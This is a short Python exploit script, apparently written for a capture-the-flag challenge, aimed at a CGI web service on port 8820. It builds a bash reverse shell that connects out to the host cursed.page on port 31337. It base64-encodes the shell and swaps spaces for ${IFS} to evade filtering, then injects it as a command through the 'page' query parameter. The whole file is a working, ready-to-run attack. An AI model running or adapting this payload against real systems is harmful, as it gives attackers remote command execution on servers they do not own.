import base64
import requests
import sys


REV_SHELL = 'bash -i >& /dev/tcp/`getent hosts cursed.page | cut -d" " -f1`/31337 0>&1'
SAFE_REV_SHELL = f'echo {base64.b64encode(REV_SHELL.encode()).decode()} | base64 -d | bash'.replace(' ', '${IFS}')
CGI_READY_REV_SHELL = b'\xca-H' + SAFE_REV_SHELL.encode() + b'; id'
VICTIM_PORT = 8820


if __name__ == '__main__':
    victim_host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    victim_addr = f'http://{victim_host}:{VICTIM_PORT}/'
    requests.get(victim_addr, params={
        'page': CGI_READY_REV_SHELL,
    })
